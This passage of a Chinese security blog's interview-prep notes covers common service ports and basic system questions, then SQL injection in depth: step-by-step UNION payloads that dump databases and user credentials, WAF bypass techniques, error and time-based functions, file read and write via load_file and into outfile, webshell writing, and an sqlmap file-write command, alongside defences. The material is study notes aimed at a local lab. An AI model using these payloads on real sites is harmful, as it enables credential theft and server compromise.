      <link href="/2022-09-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%A2%E8%AF%95+%E7%AC%94%E8%AF%95/%E8%80%83%E6%A0%B8%E9%A2%98/"/>
      <url>/2022-09-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%A2%E8%AF%95+%E7%AC%94%E8%AF%95/%E8%80%83%E6%A0%B8%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="考核题"><a href="#考核题" class="headerlink" title="考核题"></a>考核题</h1><ol><li>给你一个网站你要如何去进行漏洞测试(如淘宝,京东，仅从web页面)从登录页面开始，列举出你的思路。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 面试+笔试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>面试题</title>
      <link href="/2022-09-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%A2%E8%AF%95+%E7%AC%94%E8%AF%95/%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
      <url>/2022-09-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%A2%E8%AF%95+%E7%AC%94%E8%AF%95/%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>网安面试题</p><h1 id="基础问题"><a href="#基础问题" class="headerlink" title="基础问题"></a>基础问题</h1><h3 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">21：FTP（弱口令、匿名访问）</span><br><span class="line">22：SSH（弱口令）</span><br><span class="line">23：Telnet（弱口令、未授权访问）</span><br><span class="line">53：DNS</span><br><span class="line">445：SMB（弱口令、远程命令执行）</span><br><span class="line">1433：MSSQL（弱口令、提权）</span><br><span class="line">1521：oracle</span><br><span class="line">3306：MySQL（弱口令、提权）</span><br><span class="line">3389：RDP远程桌面（弱口令、远程代码执行）</span><br><span class="line">5432：postgresql</span><br><span class="line">6379：Redis（未授权访问）</span><br><span class="line">7001：Weblogic（弱口令、SSRF、反序列化漏洞）</span><br><span class="line">8080：TomCat（弱口令、启用PUT方法）</span><br><span class="line">27017：MongoDB（未授权访问</span><br></pre></td></tr></table></figure><h3 id="内网IP有哪些"><a href="#内网IP有哪些" class="headerlink" title="内网IP有哪些"></a>内网IP有哪些</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">环路地址：127.0.0.1-127.0.0.255</span><br><span class="line">A 类：10.0.0.0-10.255.255.255</span><br><span class="line">B 类：172.16.0.0-172.31.255.255</span><br><span class="line">C 类：192.168.0.0-192.168.255.255</span><br></pre></td></tr></table></figure><h3 id="什么是负载均衡"><a href="#什么是负载均衡" class="headerlink" title="什么是负载均衡"></a>什么是负载均衡</h3><p><strong>负载均衡</strong>（Load Balance）是由<strong>多台服务器以对称的方式组成一个服务器集群</strong>，每台服务器都具有等价的地位，都可以单独对外提供服务而无须其他服务器的辅助。经过某种负载分管技术，将外部发送来的<strong>中央请求均匀分配</strong>到对称结构中的<strong>某一台服务器</strong>上。</p><blockquote><p><a href="https://www.cnblogs.com/mrhelloworld/p/nginx.html">https://www.cnblogs.com/mrhelloworld/p/nginx.html</a></p></blockquote><p><strong>负载均衡（Load Balance），意思是将负载（工作任务，访问请求）进行平衡、分摊到多个操作单元（服务器，组件）上进行执行。是解决高性能，单点故障（高可用），扩展性（水平伸缩）的终极解决方案。</strong></p><h3 id="通过-Linux-系统的-x2F-proc-⽬录，能够获取到哪些信息，这些信息可以在安全上有哪些应⽤？"><a href="#通过-Linux-系统的-x2F-proc-⽬录，能够获取到哪些信息，这些信息可以在安全上有哪些应⽤？" class="headerlink" title="通过 Linux 系统的 &#x2F; proc ⽬录，能够获取到哪些信息，这些信息可以在安全上有哪些应⽤？"></a>通过 Linux 系统的 &#x2F; proc ⽬录，能够获取到哪些信息，这些信息可以在安全上有哪些应⽤？</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/26923061#:~:text=proc%E7%9B%AE%E5%BD%95%E6%98%AF%E4%B8%80,%E5%86%85%E6%A0%B8%E7%9A%84%E8%BF%90%E8%A1%8C%E7%8A%B6%E6%80%81%E3%80%82"><strong>proc目录介绍</strong></a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /proc</span><br></pre></td></tr></table></figure><blockquote><p>获取系统信息，硬件信息，内核版本，加载的模块，进程信息</p></blockquote><h3 id="linux-系统中，检测哪些配置⽂件的配置项，能够提升-SSH-的安全性"><a href="#linux-系统中，检测哪些配置⽂件的配置项，能够提升-SSH-的安全性" class="headerlink" title="linux 系统中，检测哪些配置⽂件的配置项，能够提升 SSH 的安全性"></a>linux 系统中，检测哪些配置⽂件的配置项，能够提升 SSH 的安全性</h3><blockquote><p>&#x2F;etc&#x2F;ssh&#x2F;sshd___config iptables 配置</p></blockquote><h3 id="如何⼀条命令查看⽂件内容最后⼀百⾏"><a href="#如何⼀条命令查看⽂件内容最后⼀百⾏" class="headerlink" title="如何⼀条命令查看⽂件内容最后⼀百⾏"></a>如何⼀条命令查看⽂件内容最后⼀百⾏</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tail -n 100 filename</span><br></pre></td></tr></table></figure><h3 id="Windows如何加固⼀个域环境下的-Windows-桌⾯⼯作环境？请给出你的思路"><a href="#Windows如何加固⼀个域环境下的-Windows-桌⾯⼯作环境？请给出你的思路" class="headerlink" title="Windows如何加固⼀个域环境下的 Windows 桌⾯⼯作环境？请给出你的思路"></a>Windows如何加固⼀个域环境下的 Windows 桌⾯⼯作环境？请给出你的思路</h3><blockquote></blockquote><h3 id="cookie和session"><a href="#cookie和session" class="headerlink" title="cookie和session"></a>cookie和session</h3><blockquote><ul><li>cookie的内容只存在在客户端，服务端直接从http请求包获取数据</li><li>session的内容存储在服务端，http请求头中的cookie只是一个key，服务端通过这个key再从自身文件或者数据库等方式获取真正的数据</li></ul></blockquote><h3 id="序列化与反序列化的区别："><a href="#序列化与反序列化的区别：" class="headerlink" title="序列化与反序列化的区别："></a>序列化与反序列化的区别：</h3><blockquote><p>序列化：把对象转化为可传输的字节序列过程称为序列化</p><p>反序列化：把字节序列还原为对象的过程称为反序列化</p></blockquote><h3 id="临时目录是哪个文件夹？"><a href="#临时目录是哪个文件夹？" class="headerlink" title="临时目录是哪个文件夹？"></a>临时目录是哪个文件夹？</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux：/tmp ，/var/tmp</span><br><span class="line">Windows：C:\Windows\Temp</span><br></pre></td></tr></table></figure><h3 id="CMD-命令⾏如何查询远程终端开放端⼝"><a href="#CMD-命令⾏如何查询远程终端开放端⼝" class="headerlink" title="CMD 命令⾏如何查询远程终端开放端⼝"></a>CMD 命令⾏如何查询远程终端开放端⼝</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /svc  </span><br><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><h3 id="3389-⽆法连接的⼏种情况"><a href="#3389-⽆法连接的⼏种情况" class="headerlink" title="3389 ⽆法连接的⼏种情况"></a>3389 ⽆法连接的⼏种情况</h3><blockquote><ul><li><p>没开放 3389 端⼝   3389   端⼝</p></li><li><p>端⼝被修改防护拦截</p></li><li><p>处于内⽹ (需进⾏端⼝转发)</p></li></ul></blockquote><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h2><p>简要的说SQL注入漏洞产生的原因就是WEB应用程序对用户输入的合法性没有判断，并且前端传入的参数是攻击者可控的，并且带入数据库查询，达到了攻击者构造非法语句实现对数据库的任意操作。</p><ol><li>SQL注入漏洞的产生需要满足两个条件：</li></ol><blockquote><ul><li>参数用户可控：比如说插入恶意SQL语句,插入到能与SQL服务器交互的WEB表单、http请求头等用户可控参数</li><li>参数带入数据库查询：在后台与原SQL语句拼接，改变原先语法结构，最终被服务器执行</li></ul></blockquote><h2 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">按照注入点类型来分类</span><br><span class="line">（1）数字型注入点</span><br><span class="line">（2）字符型注入点</span><br><span class="line">（3）搜索型注入点</span><br><span class="line">按照数据提交的方式来分类</span><br><span class="line">（1）GET 注入</span><br><span class="line">（2）POST 注入</span><br><span class="line">（3）Cookie 注入</span><br><span class="line">（4）HTTP 头部注入</span><br><span class="line">按照执行效果来分类</span><br><span class="line">（1）基于布尔的盲注</span><br><span class="line">（2）基于时间的盲注</span><br><span class="line">（3）基于报错注入</span><br><span class="line">（4）联合查询注入</span><br><span class="line">（5）堆叠注入（仅当php中使用mysqli_multi_query()函数执行sql语句（一般情况下会使用mysqli_query()）</span><br><span class="line">（6）宽字节注入</span><br><span class="line">还有一些其他的类型</span><br><span class="line">（1）二次注入</span><br><span class="line">（2）增删改注入</span><br></pre></td></tr></table></figure><h2 id="sql漏洞探测方法"><a href="#sql漏洞探测方法" class="headerlink" title="sql漏洞探测方法"></a>sql漏洞探测方法</h2><blockquote><p><a href="https://www.jianshu.com/p/5de47d05e333">https://www.jianshu.com/p/5de47d05e333</a></p></blockquote><p>只要是带有参数的动态网页并且该网页访问了数据库，那么就有可能存在 SQL 注入。</p><blockquote><ol><li><p>先加单引号’、双引号”、等看看是否报错，如果报错就可能存在SQL注入漏洞了。</p></li><li><p>还有在URL后面加 and 1&#x3D;1 、 and 1&#x3D;2 看页面是否显示一样，显示不一样的话，肯定存在SQL注入漏洞了。</p></li><li><p>还有就是Timing Attack测试，也就是时间盲注。通过简单的条件语句比如 and 1&#x3D;2 是无法看出异常的。在MySQL中，有一个Benchmark() 函数，它是用于测试性能的。 Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次 。</p><p>因此，利用benchmark函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，可以判断注入语句是否执行成功。</p></li><li><p>提交错误语句是否有异常，除此之外这些显示的错误可以通过 sleep, 修眠语句执⾏ 5 秒等，可以判断注入语句是否执行成功。</p></li></ol></blockquote><h2 id="SQL注入漏洞利用方式"><a href="#SQL注入漏洞利用方式" class="headerlink" title="SQL注入漏洞利用方式"></a>SQL注入漏洞利用方式</h2><p>具体看什么数据库类型，像 SQLSERVER 可以命令执⾏，MYSQL 写 shell 有些权限、也可以执⾏命令但是条件是在 lINUX 环境下。</p><blockquote><ul><li>数据查询（拖库）</li><li>文件读取</li><li>命令执行</li><li>提权</li></ul></blockquote><h2 id="sql注入一般步骤"><a href="#sql注入一般步骤" class="headerlink" title="sql注入一般步骤"></a>sql注入一般步骤</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#判断什么类型：</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=1 --+    id=-1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--+ </span></span><br><span class="line"></span><br><span class="line">#<span class="keyword">order</span> <span class="keyword">by</span>语句判断字段数量：</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3 --+ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#联合查询获取显示位，显示在什么地方：</span></span><br><span class="line"><span class="string">id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+ </span></span><br><span class="line"></span><br><span class="line">#获取当前数据库：</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select database()),3 --+ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#获取所有数据库：</span></span><br><span class="line"><span class="string">id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata <span class="comment">--+ </span></span><br><span class="line"></span><br><span class="line">#获取当前数据库所以表名：</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; --+ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#获取users表所有字段：</span></span><br><span class="line"><span class="string">id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users‘ --+ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">获取security.users表所有字段</span></span><br><span class="line"><span class="string">id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span><span class="comment">--+ </span></span><br><span class="line"></span><br><span class="line">#获取security.users表所有字段内容：</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,username,password from users --+</span></span><br></pre></td></tr></table></figure><h2 id="sql注入-waf的绕过方式"><a href="#sql注入-waf的绕过方式" class="headerlink" title="sql注入 waf的绕过方式"></a>sql注入 waf的绕过方式</h2><ol><li>语法层面</li></ol><blockquote><p>使用sql的一些冷门语法进行绕过，如注释，回车替代空格，大小写，换行等。一些被屏蔽的字符或者函数用等价的其他字符或者函数替代</p><p>若其他关键字符或函数被过滤：</p><blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#空格:</span><br><span class="line">括号绕过：<span class="keyword">select</span>(password)<span class="keyword">from</span>(users);</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>a等字符替代绕过：<span class="operator">%</span><span class="number">00</span>，<span class="operator">%</span><span class="number">09</span>，<span class="operator">%</span><span class="number">0</span>a，<span class="operator">%</span><span class="number">0</span>b，<span class="operator">%</span><span class="number">0</span>c，<span class="operator">%</span><span class="number">0</span>d，<span class="operator">%</span><span class="number">20</span>，<span class="operator">%</span><span class="number">2</span>b……</span><br><span class="line">(内联)注释替代绕过：<span class="comment">/**/</span>，<span class="operator">/</span><span class="operator">!</span><span class="operator">*</span><span class="operator">*</span><span class="operator">/</span></span><br><span class="line"></span><br><span class="line">#逗号：</span><br><span class="line">fromfor：substr(<span class="string">&#x27;asdzxcqwe&#x27;</span><span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">2</span>);</span><br><span class="line"><span class="keyword">join</span>：unionselect <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">3</span>)c</span><br><span class="line"><span class="keyword">offset</span>：limit1 <span class="keyword">offset</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">#单引号：</span><br><span class="line">hex编码：SELECTpassword <span class="keyword">FROM</span> Users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="number">0x61646D696E</span>  ‘roothex编码</span><br><span class="line"><span class="type">char</span>编码：SELECTFROM Users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="type">CHAR</span>(<span class="number">97</span>, <span class="number">100</span>, <span class="number">109</span>, <span class="number">105</span>, <span class="number">110</span>)</span><br><span class="line"><span class="operator">%</span><span class="number">2527</span>：`magic_quotes_gpc`开启可用</span><br><span class="line"></span><br><span class="line">#比较符号：</span><br><span class="line">等于：<span class="operator">=</span>、<span class="keyword">like</span>、regexp、rlike（默认不匹配大小写，需添加关键字<span class="type">binary</span>）</span><br><span class="line">不等于：<span class="operator">!=</span>、<span class="operator">&lt;&gt;</span>`</span><br><span class="line">大小于：greatest()、least()</span><br><span class="line">selectgreatest(ord(<span class="string">&#x27;a&#x27;</span>),<span class="number">0</span>)<span class="operator">=</span><span class="number">97</span>;</span><br><span class="line">selectord(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">between</span> <span class="number">0</span> <span class="keyword">and</span> <span class="number">97</span></span><br><span class="line"><span class="keyword">select</span>(ord(substr(<span class="string">&#x27;asd&#x27;</span><span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>)) <span class="keyword">in</span> (<span class="number">97</span>))</span><br><span class="line"><span class="keyword">Offset</span>（） https:<span class="operator">/</span><span class="operator">/</span>blog.csdn.net<span class="operator">/</span>u012927188<span class="operator">/</span>article<span class="operator">/</span>details<span class="operator">/</span><span class="number">41957879</span></span><br><span class="line">Ord() http:<span class="operator">/</span><span class="operator">/</span>www.manongjc.com<span class="operator">/</span>article<span class="operator">/</span><span class="number">885.</span>html</span><br><span class="line"></span><br><span class="line">#注释符：</span><br><span class="line"><span class="comment">-- -、%23、;%00、构造合法语句</span></span><br><span class="line"></span><br><span class="line">#等效函数：</span><br><span class="line">hex() bin()  ascii() ord()</span><br><span class="line">sleep() benchmark(<span class="number">5000000</span>,select1)</span><br><span class="line">concat_ws()  group_concat()</span><br><span class="line">mid() substr()  <span class="built_in">substring</span>()</span><br><span class="line">@<span class="variable">@user</span> <span class="keyword">user</span>()</span><br><span class="line">@<span class="variable">@datadir</span> datadir()</span><br><span class="line">…</span><br><span class="line"></span><br><span class="line">垃圾字符填充，缓冲区溢出绕过，分块传输等等</span><br></pre></td></tr></table></figure></blockquote></blockquote><ol start="2"><li>流量层面</li></ol><blockquote><ul><li>使用不同的编码传输</li><li>使用http协议的特性进行绕过，如分块传输，content-type为multipart&#x2F;form-data，超大数据包等</li></ul></blockquote><h2 id="如何突破注⼊时字符被转义？"><a href="#如何突破注⼊时字符被转义？" class="headerlink" title="如何突破注⼊时字符被转义？"></a>如何突破注⼊时字符被转义？</h2><blockquote><ul><li>宽字符注⼊</li><li>hex 编码绕过   编码绕过</li></ul></blockquote><h2 id="SQL注入防御"><a href="#SQL注入防御" class="headerlink" title="SQL注入防御"></a>SQL注入防御</h2><p>分为三个方面: <strong>参数过滤 , 预编译 以及 限制权限和报错</strong></p><blockquote><p>1.数据类型进行严格定义，数据长度进行严格规定。</p><blockquote><p>比如查询数据库某条记录的id，定义它为整型（强制类型转换），如果用户传来的数据不满足条件，要对数据进行过滤。数据长度也应该做严格限制，可以防止较长的SQL注入语句。</p></blockquote><p>2.对用户输入进转义过滤  ：例如通过转义将’转义为&#39;</p><p>3.基于攻击特征的匹配过滤  ：黑名单白名单、正则表达式过滤</p><blockquote><p>参数过滤以各种厂商以及代码的WAF为主,比如替换空格,关键字,双写,大小写,特殊字符转义</p></blockquote><p>4.采用sql语句预编译order by &#x2F; limit </p><blockquote><p>先将查询语句固定 通过函数将传参变为字符串 拼接字符串去执行 你的关键字根本不会当作关键字去执行。预编译主要依赖各种框架,比如Java的mybatis框架 和 PHP的 thinkphp框架</p><blockquote><p><a href="https://www.cnblogs.com/leezhxing/p/5282437.html">https://www.cnblogs.com/leezhxing/p/5282437.html</a></p></blockquote><blockquote><p><strong>为什么参数化查询可以防⽌ SQL 注⼊？</strong></p><p>使⽤参数化查询数据库服务器不会把参数的内容当作 sql 指令的⼀部分来执⾏，是在数据库完成 sql 指令的编译后才套⽤参数运⾏</p><p>简单的说: 参数化能防注⼊的原因在于, 语句是语句，参数是参数，参数的值并不是语句的⼀部分，数据库只按语句的语义跑</p></blockquote></blockquote><p>5.严格限制网站访问数据库的权限。 </p><blockquote><ul><li>禁⽤ root</li><li>禁⽌远程访问</li><li>禁⽌写⼊</li><li>单独帐号</li><li>禁⽌执⾏ system 等函数</li></ul></blockquote><p>6.避免直接向用户显示数据库错误。</p></blockquote><h2 id="时间盲注的函数"><a href="#时间盲注的函数" class="headerlink" title="时间盲注的函数"></a>时间盲注的函数</h2><blockquote><p>sleep，<a href="https://www.cnblogs.com/duanxz/p/3936759.html">BENCHMARK</a>，<a href="https://www.jianshu.com/p/a0cf96e0c2e2">GET_LOCK</a>是三个可以控制时间延迟返回结果的函数</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#其他函数</span><br><span class="line"><span class="keyword">left</span>(m,n) <span class="comment">--从左向右截取字符串m返回其前n位</span></span><br><span class="line">substr(m,<span class="number">1</span>,<span class="number">1</span>) <span class="comment">--取字符串m的左边第一位起，1字长的字符串</span></span><br><span class="line">ascii(m) <span class="comment">--返回字符m的ASCII码</span></span><br><span class="line">if(str1,str2,str3)<span class="comment">--如果str1正确就执行str2，否则执行str3</span></span><br><span class="line">sleep(m)<span class="comment">--使程序暂停m秒</span></span><br><span class="line">length(m) <span class="comment">--返回字符串m的长度</span></span><br><span class="line"><span class="built_in">count</span>(column_name) <span class="comment">--返回指定列的值的数目</span></span><br></pre></td></tr></table></figure><h2 id="你知道几个常用的报错注入函数？"><a href="#你知道几个常用的报错注入函数？" class="headerlink" title="你知道几个常用的报错注入函数？"></a>你知道几个常用的报错注入函数？</h2><ul><li>MySQL</li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">updatexml(); extractvalue();       </span><br><span class="line">#第二个参数包含特殊字符会报错，主要用来构造xpath语法错误。第二个参数如果不满足要求，则会报错，并且将查询结果放在报错信息里。</span><br><span class="line">#报错信息都会有报错长度限制，我们得到的数据有限</span><br><span class="line"><span class="built_in">floor</span>();                 #用来取整,不是数值就会报错。可以用来构造主键重复</span><br><span class="line"><span class="built_in">exp</span>() ；#用来构造整形溢出的错误</span><br></pre></td></tr></table></figure><ul><li>SQLserver</li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">convert</span>();   #用来类型转换,第二个参数包含特殊字符会报错</span><br><span class="line"><span class="built_in">cast</span>();        #用来类型转换,参数包含特殊字符会报错</span><br></pre></td></tr></table></figure><ul><li><p>Oracle：没有报错函数,可以用比较运算符报错</p></li><li><p>Access：不支持报错注入,只能使用枚举</p></li></ul><h2 id="报错注入的原理是什么？"><a href="#报错注入的原理是什么？" class="headerlink" title="报错注入的原理是什么？"></a>报错注入的原理是什么？</h2><p>在MYSQL中使用一些指定的函数来人为制造报错，后台没有屏蔽数据库报错信息， 在语法发生错误使得查询结果能够出现在错误信息中回显在前端，从而从报错信息中获取设定的信息。</p><p>这种手段在能返回错误信息但是联合查询受限的情况下比较好用。（一般为union注入行不通时，报错、布尔盲注和延时盲注都是可以考虑的额外手段）</p><h2 id="sql注入文件读写方式"><a href="#sql注入文件读写方式" class="headerlink" title="sql注入文件读写方式"></a>sql注入文件读写方式</h2><blockquote><p><a href="https://www.cnblogs.com/car7n/p/14848218.html">sql注入文件读写 </a></p></blockquote><ul><li>load_file() ：读取指定文件</li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">union</span>注入读取本地文件</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>mysql<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,load_file(&#x27;</span>c:<span class="operator">/</span>users<span class="operator">/</span><span class="number">91839</span><span class="operator">/</span>desktop<span class="operator">/</span><span class="number">2.</span>txt<span class="string">&#x27;) --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#也可以把文件名转换成16进制</span></span><br><span class="line"><span class="string">http://127.0.0.1/mysql/Less-1/?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="number">0x633A2F75736572732F39313833392F6465736B746F702F312E747874</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><ul><li>LOAD DATA LOCAL INFILE：读取指定文件[当secure_file_priv为null时可以代替load_file()]</li></ul><blockquote><p>当<code>secure_file_priv=null</code>时：<br><code>LOAD DATA LOCAL INFILE</code>与<code>load_file</code>都是读取本地文件，<code>load_file</code>只能在<code>secure_file_priv</code>为空时读取，而<code>LOAD DATA LOCAL INFILE</code>不受限制。<br>所以当<code>secure_file_priv</code> 的值为 NULL的时候可以用<code>LOAD DATA LOCAL INFILE</code>来充当load_file的效果</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> mysql.m1; <span class="operator">/</span><span class="operator">/</span>先删除掉这个表</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> mysql.m1 (code TEXT ); <span class="operator">/</span><span class="operator">/</span>然后创建</span><br><span class="line">LOAD DATA <span class="keyword">LOCAL</span> INFILE <span class="string">&#x27;c:/users/91839/desktop/1.txt&#x27;</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> mysql.m1 fields terminated <span class="keyword">by</span> <span class="string">&#x27;&#x27;</span>; <span class="operator">/</span><span class="operator">/</span>读取文件</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.m1; <span class="operator">/</span><span class="operator">/</span>查看文件</span><br></pre></td></tr></table></figure><ul><li><p>into outfile ：将查询的数据写入文件中</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;⼀句话&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;路径&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>into dumpfile：将查询的数据写入文件中 (只能写入一行数据)</p></li></ul><blockquote><p>(into dumpfile只能写入一行数据)<br>利用union注入写入一句话木马 into outfile 和 into dumpfile 都可以</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#语法</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;⼀句话&#x27;</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;路径&#x27;</span></span><br><span class="line">#payload</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>mysql<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,&#x27;</span>一句话<span class="string">&#x27; into outfile &#x27;</span>c:<span class="operator">/</span>users<span class="operator">/</span><span class="number">91839</span><span class="operator">/</span>desktop<span class="operator">/</span><span class="number">10.</span>txt<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><ul><li>sqlmap: –file-write 要写入的文件 –file-dest 写入的绝对路径</li></ul><blockquote><p>在sqlmap中，如果写的权限，知道绝对路径，并且secure_file_priv为空就可以写入文件<br>利用sqlmap将本地文件写入靶机的c:&#x2F;users&#x2F;91839&#x2F;desktop&#x2F;shell.txt</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http://127.0.0.1/mysql/Less-1/?id=1&quot; --random-agent --risk 3 --file-write &quot;shell.txt&quot; --file-dest &quot;c:/users/91839/desktop/shell.txt&quot;</span><br></pre></td></tr></table></figure><ul><li>开启 log 写 webshell</li></ul><h2 id="sql注入写webshell的条件"><a href="#sql注入写webshell的条件" class="headerlink" title="sql注入写webshell的条件"></a>sql注入写webshell的条件</h2><blockquote><ol><li>要知道网站绝对路径，可以通过报错，phpinfo界面，404界面等一些方式知道</li></ol><blockquote><ul><li>网站指纹</li><li>报错</li><li>默认目录，一些服务器常见的目录</li><li>一些函数会提取服务器信息</li><li>phpinfo界面，404界面</li></ul></blockquote><ol start="2"><li><p>没开启GPC转义：gpc没有开启，开启了单引号被转义了，语句就不能正常执行了</p></li><li><p>要有写file权限，默认情况下只有root有，所以要有root权限。对目录要有写权限，一般image之类的存放突破的目录就有</p></li><li><p>secure_file_prie&#x3D;空或者是指定的目录</p></li></ol></blockquote><h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><blockquote><ul><li><a href="https://blog.csdn.net/wy_97/article/details/114213955">UDF提权</a></li><li><a href="https://11pmsleep.github.io/2022-09-24-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/0x24-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/">曾写笔记</a></li></ul></blockquote><p>MySQL 可以⾃定义函数, 通过⾃定义函数做到类似 xp_cmdshell 效果</p><h2 id="宽字符注⼊"><a href="#宽字符注⼊" class="headerlink" title="宽字符注⼊"></a>宽字符注⼊</h2><blockquote><p><a href="https://www.bilibili.com/video/BV1sS4y1S7Hr?spm_id_from=333.337.search-card.all.click&amp;vd_source=e73a152dada4626bad49c30d848902f7">https://www.bilibili.com/video/BV1sS4y1S7Hr?spm_id_from=333.337.search-card.all.click&amp;vd_source=e73a152dada4626bad49c30d848902f7</a></p><p>21详解宽字节注入</p></blockquote><h3 id="宽字符注⼊的原理？"><a href="#宽字符注⼊的原理？" class="headerlink" title="宽字符注⼊的原理？"></a>宽字符注⼊的原理？</h3><p>宽字节注入主要是源于程序员设置<strong>数据库编码与 php 编码设置为不同的两个编码</strong>，这样就可能会产生宽字节注入。GBK 占用两字节，ASCII 占用一字节。</p><p>PHP 中编码为 